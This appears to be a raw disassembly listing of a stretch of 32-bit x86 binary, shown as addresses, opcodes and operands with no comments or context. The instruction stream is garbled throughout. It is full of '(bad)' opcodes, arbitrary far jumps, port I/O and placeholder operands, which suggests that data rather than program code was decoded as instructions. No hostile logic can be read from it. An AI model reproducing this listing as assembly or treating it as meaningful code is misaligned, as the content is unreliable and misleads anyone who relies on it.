  416618:	ins    BYTE PTR es:[edi],dx
  416619:	inc    esp
  41661a:	push   ebp
  41661b:	adc    edx,DWORD PTR [esi+0x33]
  41661e:	lods   al,BYTE PTR ds:[esi]
  41661f:	xor    eax,0xf633989a
  416624:	test   al,0xb2
  416626:	out    0x23,eax
  416628:	mov    al,0xcc
  41662a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41662b:	out    dx,al
  41662c:	pop    ebp
  41662d:	cmp    ecx,ecx
  41662f:	jbe    0x4165fd
  416631:	jl     0x416611
  416633:	sbb    al,0xeb
  416635:	ins    BYTE PTR es:[edi],dx
  416636:	sub    BYTE PTR [edx],ch
  416638:	mul    al
  41663a:	jmp    0x37c9:0x3a8c1768
  416641:	stos   BYTE PTR es:[edi],al
  416642:	test   al,0x76
  416644:	dec    esi
  416645:	ret    0xc032
  416648:	xor    DWORD PTR [eax-0x524a3794],0xfffffff1
  41664f:	push   0xa99b5a40
  416654:	push   DWORD PTR [edi+ebp*4+0x7979cd12]
  41665b:	fadd   st,st(4)
  41665d:	aaa    
  41665e:	imul   edx,esp,0x79
  416661:	xchg   edi,eax
  416662:	imul   ebp,DWORD PTR [ebx],0x7e
  416665:	popa   
  416666:	bound  ebx,QWORD PTR [ebx]
  416668:	in     eax,dx
  416669:	pop    ss
  41666a:	fcomp  QWORD PTR [ebx]
  41666c:	shl    DWORD PTR [eax+eiz*1+0x62],0x71
  416671:	imul   DWORD PTR [eax+eax*8+0x5c]
  416675:	xchg   edi,eax
  416676:	stos   BYTE PTR es:[edi],al
  416677:	out    dx,al
  416678:	inc    ebx
  416679:	stc    
  41667a:	imul   bx,WORD PTR [esi+0x7cf5d5c0],0xfffd
  416682:	jge    0x4166bb
  416684:	loope  0x4166a0
  416686:	jp     0x416626
  416688:	cmp    ebx,DWORD PTR [eax-0x30]
  41668b:	call   0x1004:0x467cd3
  416692:	lock push edx
  416694:	sub    dh,BYTE PTR [esi-0x48e885f3]
  41669a:	mov    ecx,0x3be17e5c
  41669f:	mov    ch,0xdf
  4166a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4166a2:	ror    DWORD PTR [ebp+0x4d0158e5],0x29
  4166a9:	test   eax,0x28ca858a
  4166ae:	or     DWORD PTR [ebp+0x3a],eax
  4166b1:	je     0x4166da
  4166b3:	je     0x4166ce
  4166b5:	ja     0x41668c
  4166b7:	or     ebp,ebx
  4166b9:	repnz inc ebp
  4166bb:	jns    0x4166fb
  4166bd:	or     eax,0x1d1fe755
  4166c2:	push   cs
  4166c3:	test   BYTE PTR cs:[ecx+0x4d],dl
  4166c7:	mov    cl,0xbf
  4166c9:	fst    QWORD PTR ds:[esi-0x5ced007]
  4166d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166d1:	mov    dl,0xa8
  4166d3:	imul   eax,edx,0x558aa7d
  4166d9:	push   cs
  4166da:	xor    ebx,ebp
  4166dc:	ins    DWORD PTR es:[edi],dx
  4166dd:	stos   DWORD PTR es:[edi],eax
  4166de:	bound  ebx,QWORD PTR [ecx+0x5f]
  4166e1:	add    dl,cl
  4166e3:	aas    
  4166e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166e5:	test   eax,0xbcefc05c
  4166ea:	dec    eax
  4166eb:	mov    ebp,0xc0a37c76
  4166f0:	mov    dl,0xee
  4166f2:	adc    DWORD PTR [ebp+ebp*2+0x5f],ebx
  4166f6:	mov    bh,BYTE PTR [esi]
  4166f8:	inc    edi
  4166f9:	dec    esi
  4166fa:	hlt    
  4166fb:	retf   0x71c9
  4166fe:	xor    dl,BYTE PTR [ebx+0x50]
  416701:	mov    ecx,0xa0f7b65d
  416706:	inc    esp
  416707:	dec    esp
  416708:	cmp    DWORD PTR [eax],edx
  41670a:	xchg   ebx,eax
  41670b:	jb     0x416752
  41670d:	stos   DWORD PTR es:[edi],eax
  41670e:	jmp    0x41674e
  416710:	and    al,cl
  416712:	into   
  416713:	mov    eax,0xffb915a4
  416718:	add    al,0xd2
  41671a:	(bad)  
  41671b:	aad    0xdf
  41671d:	add    cl,ah
  41671f:	ins    DWORD PTR es:[edi],dx
  416720:	and    DWORD PTR [edx],edi
  416722:	jecxz  0x4166f8
  416724:	mov    ds:0xb41bf8b9,eax
  416729:	nop
  41672a:	dec    esi
  41672b:	adc    dh,bh
  41672d:	popf   
  41672e:	mov    edx,0x6096574e
  416733:	sbb    DWORD PTR [ebp-0x30790db],edi
  416739:	aam    0x8d
  41673b:	call   0x9005:0xddace59
  416742:	lods   al,BYTE PTR ds:[esi]
  416743:	xor    DWORD PTR [esi],ebx
  416745:	sub    al,0xdc
  416747:	test   eax,0x5c5ce997
  41674c:	mov    ds:0xfd1a53d3,eax
  416751:	and    BYTE PTR [esi+ebp*4+0x37],bl
  416755:	in     al,0x93
  416757:	xor    al,0x1f
  416759:	mov    ds:0x3a79f82b,eax
  41675e:	sub    eax,0x1960ddbd
  416763:	mov    cl,0xa5
  416765:	mov    eax,ds:0xfde2e07b
  41676a:	sbb    eax,0x2249c4ea
  41676f:	leave  
  416770:	push   0x6170e5c8
  416775:	jne    0x416700
  416777:	add    BYTE PTR [ebx+edx*2-0x2da78010],bl
  41677e:	test   al,0xf6
  416780:	inc    ebx
  416781:	adc    DWORD PTR [ecx],ebx
  416783:	popa   
  416784:	int    0xf1
  416786:	push   edx
  416787:	fcmovu st,st(1)
  416789:	scas   eax,DWORD PTR es:[edi]
  41678a:	xor    esi,DWORD PTR [edx-0x3052c9e5]
  416790:	add    edx,esi
  416792:	daa    
  416793:	mov    ebp,0x75e569aa
  416798:	aad    0x62
  41679a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41679b:	xor    al,0x92
  41679d:	sbb    BYTE PTR [edi],0x43
  4167a0:	pop    ds
  4167a1:	std    
  4167a2:	xor    DWORD PTR [ebx],ecx
  4167a4:	mov    cl,0x8a
  4167a6:	mov    eax,ds:0x748f80e9
  4167ab:	cmp    DWORD PTR [ebx],0xffffffa1
  4167ae:	sub    eax,0xe24a45a2
  4167b3:	mov    DWORD PTR [eax+0x25],edi
  4167b6:	mov    ebx,0x72b70456
  4167bb:	push   esi
  4167bc:	xchg   esp,eax
  4167bd:	push   es
  4167be:	sub    BYTE PTR [edi-0x74],bh
  4167c1:	jb     0x416768
  4167c3:	idiv   bh
  4167c5:	scas   eax,DWORD PTR es:[edi]
  4167c6:	hlt    
  4167c7:	mov    ds:0x67d3d4e2,eax
  4167cc:	push   esp
  4167cd:	icebp  
  4167ce:	out    0xe0,eax
  4167d0:	fiadd  DWORD PTR [esi+0x43]
  4167d3:	test   al,0xbc
  4167d5:	add    BYTE PTR [ebx],ch
  4167d7:	ins    BYTE PTR es:[edi],dx
  4167d8:	mov    DWORD PTR ds:0xf4f73e69,edi
  4167de:	mov    eax,ds:0x51913b32
  4167e3:	xchg   esi,eax
  4167e4:	push   esi
  4167e5:	pop    eax
  4167e6:	jmp    0xcfa2:0x14cefc79
  4167ed:	test   DWORD PTR [edx+0x7e],edx
  4167f0:	xor    cl,dl
  4167f2:	inc    edi
  4167f3:	add    esp,DWORD PTR [ebp-0x7849165]
  4167f9:	(bad)  
  4167fa:	clc    
  4167fb:	dec    esi
  4167fc:	test   ebx,eax
  4167fe:	dec    esp
  4167ff:	xor    al,0x3b
  416801:	push   ss
  416802:	push   ecx
  416803:	jmp    0x4167d4
  416805:	sub    edi,DWORD PTR [ebp-0xf]
  416808:	imul   ebx,DWORD PTR [esi-0x6e],0xd2eb5380
  41680f:	aaa    
  416810:	in     al,dx
  416811:	fs jmp 0x41681a
  416814:	adc    al,0xbc
  416816:	stos   DWORD PTR es:[edi],eax
  416817:	pop    esp
  416818:	lock ret 
  41681a:	mov    DWORD PTR [esi-0x7bb3d4da],edi
  416820:	stos   DWORD PTR es:[edi],eax
  416821:	and    al,0x3b
  416823:	sbb    eax,0xc8b14413
  416828:	push   ebx
  416829:	cmp    cl,al
  41682b:	ja     0x4167d0
  41682d:	jb     0x416803
  41682f:	cdq    
  416830:	dec    edx
  416831:	out    0x8f,al
  416833:	stos   BYTE PTR es:[edi],al
  416834:	jno    0x416849
  416836:	mov    esp,0x7f8a9da1
  41683b:	jmp    0x83b4:0xff1cd1d3
  416842:	push   ds
  416843:	out    0xa6,al
  416845:	mov    dh,0x9d
  416847:	fdivrp st(5),st
  416849:	inc    ebx
  41684a:	push   0xffffffd8
  41684c:	in     eax,dx
  41684d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41684e:	in     al,0xfe
  416850:	or     DWORD PTR [ecx],ebx
  416852:	out    0xb3,eax
  416854:	inc    ecx
  416855:	sbb    BYTE PTR [ebx-0x4a2ef3b5],al
  41685b:	loopne 0x4168bf
  41685d:	inc    esi
  41685e:	fnstsw WORD PTR [eax-0x4ba18421]
  416864:	(bad)  
  416865:	loope  0x416850
  416867:	xchg   edi,eax
  416868:	pop    ss
  416869:	or     dl,BYTE PTR [edi-0x4e]
  41686c:	and    DWORD PTR fs:[eax-0x41],ebp
  416870:	daa    
  416871:	mov    dh,0x71
  416873:	xor    al,BYTE PTR [eax-0x5]
  416876:	xchg   edi,eax
  416877:	inc    ebp
  416878:	enter  0x8f2b,0x22
  41687c:	pop    ebp
  41687d:	dec    ebx
  41687e:	dec    edx
  41687f:	mov    al,BYTE PTR [ecx]
  416881:	mov    al,0x18
  416883:	dec    esi
  416884:	pop    ds
  416885:	xchg   ebp,eax
  416886:	mul    BYTE PTR [edi-0x5c576f5d]
  41688c:	iret   
  41688d:	jle    0x416825
  41688f:	inc    edi
  416890:	add    eax,0x73cb951
  416895:	rcr    DWORD PTR [ebx],cl
  416897:	cdq    
  416898:	jp     0x416883
  41689a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41689b:	in     eax,dx
  41689c:	mov    cl,0x65
  41689e:	loop   0x4168f5
  4168a0:	out    0xde,eax
  4168a2:	and    edi,ebp
  4168a4:	ror    DWORD PTR [edx],1
  4168a6:	fidiv  WORD PTR [ebx+0x54]
  4168a9:	push   ds
  4168aa:	jg     0x4168cc
  4168ac:	outs   dx,BYTE PTR ds:[esi]
  4168ad:	setl   BYTE PTR [esi+0x30284c64]
  4168b4:	dec    edi
  4168b5:	push   cs
  4168b6:	fstp   TBYTE PTR [ebx-0x24]
  4168b9:	ror    ebx,0x3
  4168bc:	ins    BYTE PTR es:[edi],dx
  4168bd:	ss dec edx
  4168bf:	and    cl,BYTE PTR [eax+0x6d]
  4168c2:	jno    0x416864
  4168c4:	and    ebp,DWORD PTR [eax]
  4168c6:	in     eax,0x7
  4168c8:	das    
  4168c9:	outs   dx,BYTE PTR ds:[esi]
  4168ca:	addr16 popa 
  4168cc:	dec    edx
  4168cd:	sbb    ecx,DWORD PTR [ebp-0x1c62f05]
  4168d3:	test   esi,ecx
  4168d5:	cmp    BYTE PTR [eax+0x606f7b0a],ah
  4168db:	ja     0x416897
  4168dd:	stc    
  4168de:	ret    0xf2f
  4168e1:	inc    edi
  4168e2:	mov    edi,0x1597ad78
  4168e7:	ret    0x8e07
  4168ea:	pop    esi
  4168eb:	inc    DWORD PTR [edx-0x33]
  4168ee:	fimul  DWORD PTR [ecx+ebx*1]
  4168f1:	hlt    
  4168f2:	hlt    
  4168f3:	daa    
  4168f4:	push   ebx
  4168f5:	lds    ecx,FWORD PTR [ebx+eiz*8]
  4168f8:	or     BYTE PTR [ecx-0x38],dl
  4168fb:	cmp    esi,esp
  4168fd:	out    0xa6,al
  4168ff:	pop    ss
  416900:	pop    edi
  416901:	retf   0x11f3
  416904:	sbb    DWORD PTR ds:0xb6c6f4be,eax
  41690a:	inc    esp
  41690b:	jb     0x416904
  41690d:	push   ebp
  41690e:	xor    DWORD PTR [edi+esi*2-0x3a490238],0x55a931f3
  416919:	leave  
  41691a:	stos   BYTE PTR es:[edi],al
  41691b:	pop    esp
  41691c:	dec    edi
  41691d:	sbb    DWORD PTR [ecx-0x2733ab85],edx
  416923:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416924:	xchg   ecx,eax
  416925:	add    BYTE PTR [eax],0x47
  416928:	ss inc eax
  41692a:	jge    0x4168f3
  41692c:	jne    0x4168e0
  41692e:	inc    edx
  41692f:	pushf  
  416930:	pop    ss
  416931:	mov    esi,0xa556dd97
  416936:	out    0x35,eax
  416938:	js     0x4168d9
  41693a:	adc    ecx,DWORD PTR [eax+0x28]
  41693d:	mov    ?,ecx
  41693f:	nop
  416940:	hlt    
  416941:	jb     0x41693e
  416943:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416944:	mov    dh,0x11
  416946:	je     0x4169ad
  416948:	cmp    BYTE PTR [esi-0x66b8c957],0x40
  41694f:	retf   0xa137
  416952:	xor    cl,dh
  416954:	xchg   DWORD PTR gs:[ecx+eax*2],ebp
  416958:	sub    al,0x31
  41695a:	xchg   ebp,eax
  41695b:	mov    bl,0x70
  41695d:	pop    ecx
  41695e:	dec    edi
  41695f:	or     eax,0x9c49f913
  416964:	jae    0x4169d0
  416966:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416967:	lods   al,BYTE PTR ds:[esi]
  416968:	shr    DWORD PTR [ebx],0x2c
  41696b:	cmp    dl,BYTE PTR [ebx]
  41696d:	ret    
  41696e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41696f:	xor    eax,0xe589e1f5
  416974:	inc    eax
  416975:	imul   bl
  416977:	enter  0xddca,0xf9
  41697b:	cmp    dh,BYTE PTR [ebx-0x8]
  41697e:	inc    ebx
  41697f:	pop    ebx
  416980:	fstp   DWORD PTR [edi]
  416982:	(bad)  
  416983:	scas   al,BYTE PTR es:[edi]
  416984:	jns    0x74009bc9
  41698a:	sub    BYTE PTR [ebp+0x9],dh
  41698d:	ins    BYTE PTR es:[edi],dx
  41698e:	aad    0xe1
  416990:	popa   
  416991:	and    BYTE PTR [edx],bh
  416993:	jp     0x416951
  416995:	xchg   edx,eax
  416996:	in     eax,dx
  416997:	adc    esi,DWORD PTR [edx]
  416999:	enter  0xf473,0x94
  41699d:	cmp    eax,esi
  41699f:	jb     0x4169ef
  4169a1:	sbb    BYTE PTR [eax+0x1aec98bc],bl
  4169a7:	call   0x8dc6d215
  4169ac:	(bad)  
  4169ad:	mov    al,0xca
  4169af:	sar    ch,1
  4169b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169b2:	push   ebx
  4169b3:	jmp    0x4336:0xec778aff
  4169ba:	and    eax,0x7f09474b
  4169bf:	imul   ecx,edi,0xffffffb5
  4169c2:	mov    esp,DWORD PTR [ebx+ebp*4+0x7097a15f]
  4169c9:	(bad)  
  4169cb:	addr16 xor al,al
  4169ce:	mov    bh,0x99
  4169d0:	xor    DWORD PTR [ebx+ebp*2-0x54],0x2f795e3e
  4169d8:	fxch   st(5)
  4169da:	add    ebx,DWORD PTR [esi-0x37]
  4169dd:	imul   esp,DWORD PTR fs:0x7444c8e4,0x30
  4169e5:	repz rcr BYTE PTR [ebx+0x31dfb984],cl
  4169ec:	mov    al,0x8d
  4169ee:	adc    al,0x3b
  4169f0:	dec    edi
  4169f1:	mov    eax,ds:0x93251355
  4169f6:	cs pop es
  4169f8:	sbb    eax,0x9e914469
  4169fd:	aam    0x7a
  4169ff:	out    dx,ax
  416a01:	addr16 sahf 
  416a03:	inc    ebx
  416a04:	mov    esi,0x3dc66471
  416a09:	scas   al,BYTE PTR es:[edi]
  416a0a:	pop    ds
  416a0b:	lods   eax,DWORD PTR ds:[esi]
  416a0c:	icebp  
  416a0d:	mov    dl,0x92
  416a0f:	(bad)  
  416a10:	jmp    0x14ec:0xa01b1e1a
  416a17:	pop    ds
  416a18:	push   esi
  416a19:	pop    ss
  416a1a:	ds pop edx
  416a1c:	daa    
  416a1d:	adc    al,0x40
  416a1f:	cmp    eax,0xa4eac0d4
  416a24:	push   DWORD PTR [esi]
  416a26:	pop    edi
  416a27:	mov    esp,0x5e9015d4
  416a2c:	xchg   BYTE PTR [ebp-0x66759426],cl
  416a32:	mov    WORD PTR cs:[ebx+0x3f],?
  416a36:	sub    DWORD PTR [esp+edi*1+0x36],esp
  416a3a:	xchg   edx,eax
  416a3b:	mov    ecx,0x73b49a8e
  416a40:	icebp  
  416a41:	push   esp
  416a42:	jge    0x416a4f
  416a44:	data16 jg 0x4169d8
  416a47:	ins    DWORD PTR es:[edi],dx
  416a48:	jl     0x416a05
  416a4a:	dec    DWORD PTR [esi+0x109daf32]
  416a50:	lods   al,BYTE PTR ds:[esi]
  416a51:	xchg   edi,eax
  416a52:	test   DWORD PTR [eax+0x22],edi
  416a55:	jno    0x4169e0
  416a57:	add    ebx,DWORD PTR [ecx-0x75]
  416a5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a5b:	ins    BYTE PTR es:[edi],dx
  416a5c:	cmp    DWORD PTR [edx],edi
  416a5e:	mov    ds:0x29acd5b2,eax
  416a63:	push   es
  416a64:	dec    edx
  416a65:	push   esp
  416a66:	sub    BYTE PTR [ebp-0x68b24c7e],bl
  416a6c:	repz or BYTE PTR ds:0x5dc9dd77,al
  416a73:	xchg   ebx,eax
  416a74:	fist   DWORD PTR [eax+edi*4-0x73]
  416a78:	test   BYTE PTR [eax+0x6f],dl
  416a7b:	pop    es
  416a7c:	push   ds
  416a7d:	jno    0x416aae
  416a7f:	jl     0x416ab5
  416a81:	scas   al,BYTE PTR es:[edi]
  416a82:	in     eax,dx
  416a83:	cmp    ah,BYTE PTR [edx-0x3bc6f2ee]
  416a89:	or     esi,DWORD PTR [edi-0x5e3c9889]
  416a8f:	ret    0xf5ab
  416a92:	test   al,0x1b
  416a94:	jae    0x416acd
  416a96:	imul   eax,DWORD PTR [edi-0x2f],0xffffffd5
  416a9a:	pop    ss
  416a9b:	test   dh,0xde
  416a9e:	sub    DWORD PTR [ecx],0x33
  416aa1:	jae    0x416a5d
  416aa3:	outs   dx,DWORD PTR ds:[esi]
  416aa4:	xor    eax,0xc86bec19
  416aa9:	dec    ecx
  416aaa:	data16 out 0x56,al
  416aad:	mov    ah,0xa5
  416aaf:	lods   eax,DWORD PTR ds:[esi]
  416ab0:	in     eax,0xf0
  416ab2:	fs pop ss
  416ab4:	imul   ebx,DWORD PTR [edx-0x65a6c60c],0xffffff96
  416abb:	call   0xa9a7bf0e
  416ac0:	ficomp DWORD PTR [ebp-0x68]
  416ac3:	push   edi
  416ac4:	into   
  416ac5:	rcl    DWORD PTR [ebx-0x3b704566],0x33
  416acc:	test   DWORD PTR [edx],eax
  416ace:	pop    ebx
  416acf:	lds    edi,FWORD PTR [ebp+0x56959413]
  416ad5:	loop   0x416aff
  416ad7:	pop    ss
  416ad8:	(bad)  
  416ad9:	(bad)  
  416ada:	ins    DWORD PTR es:[edi],dx
  416adb:	shl    DWORD PTR [ebx-0x45],0xf3
  416adf:	mov    dh,0x75
  416ae1:	add    al,0x5a
  416ae3:	cs out dx,al
  416ae5:	sahf   
  416ae6:	xchg   ebx,eax
  416ae7:	rcr    esp,cl
  416ae9:	pop    edx
  416aea:	mov    edi,0x65adb38f
  416aef:	arpl   WORD PTR [eax],dx
  416af1:	pusha  
  416af2:	pop    esp
  416af3:	push   es
  416af4:	push   ebp
  416af5:	iret   
  416af6:	call   0xeb8b57cd
  416afb:	jmp    0x8e097d75
  416b00:	jp     0x416a8b
  416b02:	rcr    bl,cl
  416b04:	mov    cs,WORD PTR [eax+0x5bad5bcd]
  416b0a:	in     al,dx
  416b0b:	popf   
  416b0c:	or     ebp,DWORD PTR [ebp+0x2763c60b]
  416b12:	addr16 call 0x26ed:0xe593c825
  416b1a:	dec    eax
  416b1b:	push   edx
  416b1c:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  416b1e:	push   ds
  416b1f:	out    0x7b,al
  416b21:	mov    eax,ds:0x2ad9c88e
  416b26:	int3   
  416b27:	das    
  416b28:	mov    cs,WORD PTR [ecx+0x3ec575be]
  416b2e:	xchg   edx,eax
  416b2f:	scas   eax,DWORD PTR es:[edi]
  416b30:	repz pusha 
  416b32:	add    ebp,DWORD PTR cs:[edx]
  416b35:	rcr    dl,1
  416b37:	dec    edx
  416b38:	push   ebx
  416b39:	sub    esi,0xa05fd384
  416b3f:	pop    ebx
  416b40:	js     0x416b95
  416b42:	test   BYTE PTR [edi],cl
  416b44:	sbb    al,0x4c
  416b46:	mov    ebx,0x654f1a31
  416b4b:	test   eax,0xe0773cbf
  416b50:	inc    eax
  416b51:	je     0x416b14
  416b53:	dec    ebp
  416b54:	cdq    
  416b55:	mov    edi,0xa1a767f6
  416b5a:	sbb    BYTE PTR [edi],bh
  416b5c:	sub    ecx,edi
  416b5e:	ror    BYTE PTR [edx-0x2fb91702],cl
  416b64:	pop    edx
  416b65:	out    dx,eax
  416b66:	mov    ecx,0x2c42bdb2
  416b6b:	test   al,0x1b
  416b6d:	out    0xac,al
  416b6f:	mov    bl,0x44
  416b71:	retf   
  416b72:	aam    0x6b
  416b74:	inc    edi
  416b75:	xor    DWORD PTR [eax+0x3791bb76],edi
  416b7b:	mov    edx,DWORD PTR [eax+edi*2-0x7]
  416b7f:	out    dx,al
  416b80:	or     al,0x2a
  416b82:	jge    0x416b2a
  416b84:	pop    edi
  416b85:	aad    0xba
  416b87:	xchg   esp,eax
  416b88:	mov    bl,0x7
  416b8a:	fisttp DWORD PTR [edx-0x5ec72b70]
  416b90:	(bad)  
  416b91:	fisubr DWORD PTR [ecx]
  416b93:	ins    BYTE PTR es:[edi],dx
  416b94:	mov    ebx,0xc0f6794c
  416b99:	push   es
  416b9a:	pushf  
  416b9b:	test   al,0x16
  416b9d:	dec    edx
  416b9e:	pop    ecx
  416b9f:	(bad)  
  416ba0:	ror    BYTE PTR [ebp+0x42111783],cl
  416ba6:	jns    0x416b56
  416ba8:	adc    al,0x32
  416baa:	mov    cl,0xa4
  416bac:	pop    ds
  416bad:	mov    esp,0x7b5ade30
  416bb2:	cmp    BYTE PTR [ebx+0x3a],dh
  416bb5:	push   0x829fe5a7
  416bba:	mov    ch,0xc8
  416bbc:	push   0x358ac0e2
  416bc1:	scas   eax,DWORD PTR es:[edi]
  416bc2:	(bad)  
  416bc3:	retf   0x574
  416bc6:	sbb    al,0xe0
  416bc8:	aam    0xcb
  416bca:	(bad)  
  416bcb:	not    DWORD PTR [eax+edx*1+0x49be99f1]
  416bd2:	fisttp QWORD PTR ss:[ebp+0x3d719afa]
  416bd9:	push   ds
  416bda:	in     eax,dx
  416bdb:	xor    eax,0x40dae942
  416be0:	add    esi,DWORD PTR [ebx+0x17b759fb]
  416be6:	or     DWORD PTR [edi+0x1165cc5b],esi
  416bec:	pusha  
  416bed:	inc    esp
  416bee:	mov    BYTE PTR [ecx],al
  416bf0:	and    DWORD PTR cs:[ebx-0x414522a6],ecx
  416bf7:	xchg   edi,eax
  416bf8:	(bad)  
  416bf9:	mov    ah,0xea
  416bfb:	outs   dx,DWORD PTR ds:[esi]
  416bfc:	jbe    0x416be6
  416bfe:	add    esi,DWORD PTR [ecx+0x67]
  416c01:	test   DWORD PTR [esi+0x5e69123e],edx
  416c07:	jo     0x416bba
  416c09:	int3   
  416c0a:	aam    0x40
  416c0c:	loop   0x416c40
  416c0e:	(bad)  
  416c0f:	imul   edi,DWORD PTR ds:0xf2c6b61e,0x5934a885
  416c19:	call   0xb9c1:0xc5289ac8
  416c20:	inc    edi
  416c21:	cwde   
  416c22:	fisub  WORD PTR [ebp-0x69dbbff6]
  416c28:	js     0x416bd2
  416c2a:	data16 outs dx,BYTE PTR ds:[si]
  416c2d:	xor    eax,0x54301fd8
  416c32:	jns    0x416be5
  416c34:	or     bp,cx
  416c37:	jmp    0x1b5676a0
  416c3c:	lea    ecx,[esp+eiz*2]
  416c3f:	xchg   ebp,eax
  416c40:	xchg   DWORD PTR [ebp+ebp*4+0x50f5f714],esi
  416c47:	clc    
  416c48:	adc    edi,eax
  416c4a:	stos   BYTE PTR es:[edi],al
  416c4b:	hlt    
  416c4c:	js     0x416c77
  416c4e:	mov    ebp,0xe997a529
  416c53:	mov    esp,0xef7f817d
  416c58:	test   ebx,edi
  416c5a:	xchg   ecx,eax
  416c5b:	leave  
  416c5c:	add    DWORD PTR [esi+0x53],eax
  416c5f:	iret   
  416c60:	(bad)  
  416c61:	ja     0x416c06
  416c63:	in     al,dx
  416c64:	inc    ecx
  416c65:	leave  
  416c66:	pop    ss
  416c67:	mov    cl,0x8b
  416c69:	mov    cl,0x5a
  416c6b:	inc    DWORD PTR [edi+esi*2]
  416c6e:	mov    dh,0x2c
  416c70:	or     ecx,DWORD PTR [edi+0x67]
  416c73:	fild   DWORD PTR [esi-0x2]
  416c76:	call   0x87d325c1
  416c7b:	jle    0x416c3f
  416c7d:	ret    0x1d9a
  416c80:	retf   0x2de8
  416c83:	cwde   
  416c84:	sbb    eax,DWORD PTR [ebx+0x50]
  416c87:	pop    ss
  416c88:	or     dl,BYTE PTR [ecx-0x5e007daa]
  416c8e:	adc    bl,cl
  416c90:	out    dx,eax
  416c91:	retf   0x7fad
  416c94:	ret    
  416c95:	loope  0x416c48
  416c97:	sbb    eax,0x8a19ee43
  416c9c:	inc    ecx
  416c9d:	dec    ebp
  416c9e:	xor    esp,DWORD PTR [ebp+0x25]
  416ca1:	adc    al,0xfe
  416ca3:	cmp    al,0xf9
  416ca5:	imul   eax,DWORD PTR [edi-0x3f],0x1f
  416ca9:	in     eax,dx
  416caa:	xchg   DWORD PTR [edi],ebp
  416cac:	aam    0xe6
  416cae:	xor    eax,0xa14162f6
  416cb3:	jecxz  0x416ce5
  416cb5:	inc    esi
  416cb6:	inc    ecx
  416cb7:	mov    esp,0x38880999
  416cbc:	mov    WORD PTR [eax-0x3d2c500c],ds
  416cc2:	push   esp
  416cc3:	call   0xc0811c7b
  416cc8:	xor    bl,BYTE PTR [esi-0x5c]
  416ccb:	fs mov dh,0xe4
  416cce:	leave  
  416ccf:	lock xor eax,0x8184d97a
  416cd5:	mov    dh,0xf
  416cd7:	jmp    0x416cef
  416cd9:	add    BYTE PTR [edi],bh
  416cdb:	lds    ecx,FWORD PTR [edx]
  416cdd:	dec    edx
  416cde:	enter  0xe387,0x6e
  416ce2:	xchg   edi,eax
  416ce3:	pop    ebp
  416ce4:	inc    esp
  416ce5:	lods   eax,DWORD PTR ds:[esi]
  416ce6:	loop   0x416d42
  416ce8:	mov    edi,0xcbcb7ad1
  416ced:	or     DWORD PTR [esi-0x61],eax
  416cf0:	xchg   edi,eax
  416cf1:	push   ds
  416cf2:	rcl    BYTE PTR [ebx],cl
  416cf4:	loop   0x416cb0
  416cf6:	mov    al,0xce
  416cf8:	pop    es
  416cf9:	or     dh,0xdb
  416cfc:	xlat   BYTE PTR ds:[ebx]
  416cfd:	xchg   esp,eax
  416cfe:	stos   BYTE PTR es:[edi],al
  416cff:	fsubr  QWORD PTR [edx-0x67]
  416d02:	jae    0x416d58
  416d04:	fisttp QWORD PTR [ecx]
  416d06:	xor    BYTE PTR [ebp-0x19a9a8fa],ah
  416d0c:	outs   dx,DWORD PTR ds:[esi]
  416d0d:	scas   al,BYTE PTR es:[edi]
  416d0e:	into   
  416d0f:	fisttp DWORD PTR ds:0x7fd54c73
  416d15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d16:	cmp    BYTE PTR [eax-0x15bb56ab],dh
  416d1c:	fidivr WORD PTR [ebp+0x73]
  416d1f:	and    ebx,0xf13e360b
  416d25:	and    BYTE PTR [ebx],al
  416d27:	popf   
  416d28:	sbb    dh,BYTE PTR [esp+ecx*1]
  416d2b:	rcl    BYTE PTR [edi],0xc9
  416d2e:	pop    esp
  416d2f:	sbb    al,al
  416d31:	popa   
  416d32:	mov    ecx,edi
  416d34:	jmp    0xaca8:0x415b16c9
  416d3b:	jecxz  0x416d25
  416d3d:	xchg   ch,bl
  416d3f:	not    DWORD PTR ds:0x9bfb270e
  416d45:	cmc    
  416d46:	mov    edi,0x2a1f30ee
  416d4b:	push   ss
  416d4c:	cmp    ah,BYTE PTR [eax-0x2f8dab95]
  416d52:	mov    esp,0x5b708ca9
  416d57:	add    bl,BYTE PTR [edx+0x52a4fd88]
  416d5d:	imul   edi,DWORD PTR [edx],0xffffffef
  416d60:	xor    DWORD PTR [ebx-0x50fcc947],edi
  416d66:	fistp  QWORD PTR [esi]
  416d68:	inc    esi
  416d69:	fs push eax
  416d6b:	xchg   esp,eax
  416d6c:	stos   BYTE PTR es:[edi],al
  416d6d:	add    esi,DWORD PTR [ecx-0x36]
  416d70:	or     bl,BYTE PTR [eax-0x23]
  416d73:	cdq    
  416d74:	cs pop edi
  416d76:	test   al,0x92
  416d78:	mov    eax,0x269e2e7d
  416d7d:	xchg   esi,eax
  416d7e:	pop    esi
  416d7f:	inc    ecx
  416d80:	in     al,0xc5
  416d82:	sbb    DWORD PTR [edi-0x7d],0xe77bb652
  416d89:	aas    
  416d8a:	mov    al,0x64
  416d8c:	lahf   
  416d8d:	or     DWORD PTR [ecx+0x3a],edi
  416d90:	mov    cl,0x40
  416d92:	popw   ds
  416d94:	mov    eax,0xf3bc6777
  416d99:	sbb    BYTE PTR [ebx],bl
  416d9b:	pop    ebp
  416d9c:	push   0xffffff8d
  416d9e:	lds    esp,FWORD PTR [ecx]
  416da0:	out    0xc5,eax
  416da2:	xchg   DWORD PTR ds:0xff78860,edx
  416da8:	cmp    DWORD PTR [ecx],edi
  416daa:	es loop 0x416e00
  416dad:	dec    edi
  416dae:	push   edx
  416daf:	jge    0x416db2
  416db1:	sub    al,0xe
  416db3:	xor    al,BYTE PTR [esi+0x5a013b37]
  416db9:	add    DWORD PTR [eax-0x77e088f5],edi
